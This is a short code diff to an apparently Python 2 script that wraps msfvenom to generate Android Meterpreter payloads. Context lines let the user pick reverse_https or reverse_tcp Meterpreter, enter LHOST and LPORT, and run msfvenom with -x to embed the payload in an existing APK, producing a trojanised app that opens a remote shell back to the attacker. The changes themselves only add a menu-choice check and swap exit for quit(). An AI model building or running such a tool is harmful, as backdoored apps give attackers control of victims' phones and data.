@@ -30,6 +30,9 @@ if payload == "2":
  pay ="android/meterpreter/reverse_https" 
 if payload == "3":
  pay ="android/meterpreter/reverse_tcp"
+else:
+ print ("You need to choose a number between 1-3!")
+ quit()
 
 host = raw_input("LHOST:")
 port = raw_input("LPORT:")
@@ -41,5 +44,5 @@ if gen == "y":
   os.popen ("".join(("msfvenom -x "+apkname, " -p "+pay, " LHOST="+host, " LPORT="+port, " -o "+nameaf )))
 
 else: 
-   exit 
+   quit() 
 
